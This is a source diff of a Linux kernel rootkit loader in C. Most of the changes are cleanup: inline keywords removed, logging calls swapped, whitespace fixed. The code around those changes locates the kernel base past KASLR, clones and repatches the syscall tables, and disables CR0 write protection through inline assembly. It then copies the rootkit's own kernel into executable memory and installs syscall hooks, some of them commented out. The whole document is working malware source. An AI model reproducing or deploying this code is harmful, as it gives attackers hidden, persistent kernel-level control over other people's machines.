@@ -90,31 +90,31 @@ long image_sct = 0, image_ia32sct = 0, image_text = 0, text_size = 0, image_sct_
 int disassemble(void *code, size_t code_len);
 int safe_zero(void *dst, size_t len);
 int clone_sct(void *dst, void *src, size_t len);
-inline void install_hooks(void);
-inline int calc_addr_offset(void);
+void install_hooks(void);
+int calc_addr_offset(void);
 long rand64(void);
 int rand32(void);
-inline mm_segment_t *search_addr_limit(void);
-inline long find_kernel_base(long start);
-inline int load_params(void);
-inline long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen);
+mm_segment_t *search_addr_limit(void);
+long find_kernel_base(long start);
+int load_params(void);
+long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen);
 void *my_vmalloc_range(ulong size, ulong start, ulong end, gfp_t gfp_mask, pgprot_t prot, ulong vm_flags);
-inline int clone_syscall_tables(void);
-inline int patch_syscall_tables_refs(void);
-inline int install_rkkernel(void);
-inline int unpatch_syscall_tables_refs(void);
-inline void release_cloned_syscall_tables(void);
-inline void release_rkkernel(void);
-inline int unload(void);
+int clone_syscall_tables(void);
+int patch_syscall_tables_refs(void);
+int install_rkkernel(void);
+int unpatch_syscall_tables_refs(void);
+void release_cloned_syscall_tables(void);
+void release_rkkernel(void);
+int unload(void);
 
 // those clears/sets the WP bit from CR0, to be able to disable the memory write protection.
-inline void disable_wp(void);
-inline void enable_wp(void);
+void disable_wp(void);
+void enable_wp(void);
 
 /*
  * Function definitions.
  */
-inline int load(void) {
+int load(void) {
 	int ret = 0;
 
 	addr_limit = search_addr_limit();
@@ -155,8 +155,8 @@ inline int load(void) {
 		return -2;
 	}
 
-	pinfo("kernel_tree = %d\n", kernel_tree);
-	pinfo("fs          = %lx\n", my_get_fs().seg);
+	printk("kernel_tree = %d\n", kernel_tree);
+	printk("fs          = %lx\n", my_get_fs().seg);
 	//return -1;
 
 	/*
@@ -184,8 +184,8 @@ inline int load(void) {
 	sys_call_table = (void *)(kernel_base - image_text + image_sct);
 	ia32_sys_call_table = (void *)(kernel_base - image_text + image_ia32sct);
 
-	pinfo("Parameters:\n");
 	pinfo("kernel_base         = %lx\n", kernel_base);
+	pinfo("Parameters:\n");
 	pinfo("image .text         = %lx\n", image_text);
 	pinfo("image sct           = %lx\n", image_sct);
 	pinfo("image sct len       = %ld\n", image_sct_len);
@@ -194,7 +194,7 @@ inline int load(void) {
 	pinfo(".text size          = %ld\n", text_size);
 	pinfo("sys_call_table      = %lx\n", sys_call_table);
 	pinfo("ia32_sys_call_table = %lx\n", ia32_sys_call_table);
-	
+
 	sct_refs = find_int_bytecode_refs((void *)kernel_base, text_size, (int)sys_call_table, &nsct_refs);
 	pinfo("Found %d refs to sys_call_table in kernel's .text\n", nsct_refs);
 	ia32sct_refs = find_int_bytecode_refs((void *)kernel_base, text_size, (int)ia32_sys_call_table, &nia32sct_refs);
@@ -211,7 +211,7 @@ inline int load(void) {
 		perr("Sorry, can't clone_syscall_tables().\n");
 		return -2;
 	}
-	
+
 	/*
 	 * Patch references to syscall tables, on the .text section.
 	 */
@@ -229,12 +229,15 @@ inline int load(void) {
 	}
 
 	f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
-	pinfo("Calling RK's Kernel test function ...\n");
+	pinfo("Calling RK's Kernel test function (%lx) ...\n", f_kernel_test);
+	//f_printk("load() at %lx\n", load);
 	f_kernel_test();
 
 	f_kernel_init = kernel_addr + ((unsigned long)&kernel_init - (unsigned long)&kernel_start);
-	pinfo("Initializing kernel ...\n");
+	pinfo("Initializing kernel (%lx) ...\n", f_kernel_init);
 	f_kernel_init();
+
+	pinfo("Probably if you arrived here, I'm going to work fine! =)\n");
 
 	/*
 	 * Setup hooks, and we're done.
@@ -250,7 +253,7 @@ inline int load(void) {
 	return -1;
 }
 
-inline int unload(void) {
+int unload(void) {
 	/* This only for devel, we must uninstall loader and reboot to successfully unload the rootkit */
 	// May crash some process due to the unhide protection
 	pinfo("Unpatching syscall tables refs ...\n");
@@ -262,16 +265,16 @@ inline int unload(void) {
 	return -1;
 }
 
-inline void release_cloned_syscall_tables(void) {
+void release_cloned_syscall_tables(void) {
 	vfree(my_sct);
 	vfree(my_ia32sct);
 }
 
-inline void release_rkkernel(void) {
+void release_rkkernel(void) {
 	vfree(kernel_addr);
 }
 
-inline int unpatch_syscall_tables_refs(void) {
+int unpatch_syscall_tables_refs(void) {
 	int n = 0, addr = 0, ret = 0, *p = NULL;
 
 	// first patch refs to sys_call_table, and later to ia32_sys_call_table
@@ -306,7 +309,9 @@ inline int unpatch_syscall_tables_refs(void) {
 	return 0;
 }
 
-inline void install_hooks(void) {
+void install_hooks(void) {
+	//size_t len = 0;
+	//char   *p = NULL;
 	//HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
 	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
 
@@ -324,7 +329,13 @@ inline void install_hooks(void) {
 	/* Process management */
 	//HOOK64(__NR_fork, KADDR(my_fork64));
 	//HOOK64(__NR_vfork, KADDR(my_vfork64));
-	//HOOK64(__NR_clone, KADDR(my_clone64));
+	/*for (len = 0, p = sys_call_table[__NR_clone]; p[len] != 0xc3; len++) {
+	}
+	tr_clone64_bytecode = kmalloc(len, GFP_KERNEL);
+	memcpy(tr_clone64_bytecode, p, len);
+	tr_clone64 = (void *) tr_clone64_bytecode;
+	HOOK64(__NR_clone, KADDR(my_clone64));
+	*/
 	/*
 	HOOK64(__NR_wait4, KADDR(my_wait464));
 	HOOK64(__NR_kill, KADDR(my_kill64));
@@ -410,11 +421,11 @@ int clone_sct(void *dst, void *src, size_t len) {
 }
 
 // from http://vulnfactory.org/blog/2011/08/12/wp-safe-or-not/
-inline void disable_wp(void) {
+void disable_wp(void) {
 	asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
 }
 
-inline void enable_wp(void) {
+void enable_wp(void) {
 	asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
 }
 
@@ -460,7 +471,7 @@ int rand32(void) {
     return (int)rand64();
 }
 
-inline int calc_addr_offset(void) {
+int calc_addr_offset(void) {
     return (rand32() % 1024 + 1) * PAGE_SIZE;;
 }
 
@@ -475,7 +486,7 @@ inline int calc_addr_offset(void) {
  *
  * Finally this way is generic between versions.
  */
-inline mm_segment_t *search_addr_limit(void) {
+mm_segment_t *search_addr_limit(void) {
 	char *cts = NULL;
 	char *cti = NULL;
 	off_t i = 0;
@@ -501,7 +512,7 @@ inline mm_segment_t *search_addr_limit(void) {
 /*
  * This functions locates the _text address (kernel base), with(out) KASLR.
  */
-inline long find_kernel_base(long start) {
+long find_kernel_base(long start) {
 	off_t off = 0, inc = 0x100000;
 	char opcode = 0;
 
@@ -516,7 +527,7 @@ inline long find_kernel_base(long start) {
  * Load parameters from user-land's loader, into this kernel-space.
  * For that, we use an intermediate file, because passing args here is not generic.
  */
-inline int load_params(void) {
+int load_params(void) {
 	void *tmp = NULL;
 	int ret = 0;
 	mm_segment_t old_fs;
@@ -581,7 +592,7 @@ inline int load_params(void) {
 	return 0;
 }
 
-inline long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen) {
+long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen) {
     off_t off = 0;
     int *p = NULL;
     long *refs = NULL;
@@ -655,7 +666,7 @@ fail:
 	return NULL;
 }
 
-inline void clear_vm_uninitialized_flag(struct vm_struct *vm) {
+void clear_vm_uninitialized_flag(struct vm_struct *vm) {
 	/*
 	 * Before removing VM_UNINITIALIZED,
 	 * we should make sure that vm has proper values.
@@ -698,7 +709,7 @@ fail:
 	return NULL;
 }
 
-inline int clone_syscall_tables(void) {
+int clone_syscall_tables(void) {
 	size_t my_sct_pagelen = 0;
 	int ret = 0;
 
@@ -783,7 +794,7 @@ inline int clone_syscall_tables(void) {
 	return 0;
 }
 
-inline int patch_syscall_tables_refs(void) {
+int patch_syscall_tables_refs(void) {
 	int n = 0, addr = 0, ret = 0, *p = NULL;
 
 	// first patch refs to sys_call_table, and later to ia32_sys_call_table
@@ -818,45 +829,44 @@ inline int patch_syscall_tables_refs(void) {
 	return 0;
 }
 
-inline int install_rkkernel(void) {
+int install_rkkernel(void) {
 	int ret = 0;
 
-	pinfo("Installing the rootkit's kernel ...\n");
-
 	pinfo("RK's Kernel info:\n");
-    pinfo("kernel_len           = %d\n", kernel_len);
+	pinfo("kernel_len           = %d\n", kernel_len);
 	pinfo("kernel_paglen        = %d\n", kernel_paglen);
 	pinfo("kernel_pages         = %d\n", kernel_pages);
 	pinfo("kernel_start         = %lx\n", &kernel_start);
 	pinfo("kernel_start_pagdown = %lx\n", PAGE_ROUND_DOWN(&kernel_start));
-    
+
 	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
-    //kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
-    kernel_addr = my_vmalloc_range(kernel_paglen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0);
-    if (kernel_addr == NULL) {
-        perr("Sorry, can't allocate memory.\n");
-        return -2;
-    }
-    
+	//kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
+	kernel_addr = my_vmalloc_range(kernel_paglen, vmalloc_start, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0);
+	if (kernel_addr == NULL) {
+		perr("Sorry, can't allocate memory.\n");
+		return -2;
+	}
+
 	pinfo("kernel_addr          = %lx\n", kernel_addr);
 	pinfo("kernel_addr_pagdown  = %lx\n", PAGE_ROUND_DOWN(kernel_addr));
 
-    /*
-     * Make our rootkit code executable.
-     */
-    //ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
-    //pinfo("ret = %d\n", ret);
-    //pinfo("kernel_addr's pages are now executable.\n");
+	/*
+	 * Make our rootkit code executable.
+	 */
+	//ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
+	//pinfo("ret = %d\n", ret);
+	//pinfo("kernel_addr's pages are now executable.\n");
 
-    ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
-    if (ret != 0) {
-        perr("Sorry, can't copy kernel to its place.\n");
-        return -2;
-    }
+	pinfo("Installing the rootkit's kernel ...\n");
+	ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
+	if (ret != 0) {
+		perr("Sorry, can't copy kernel to its place.\n");
+		return -2;
+	}
 
 	pinfo("RK's Kernel is now installed.\n");
 
-    //disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
+	//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
 
 	return 0;
 }
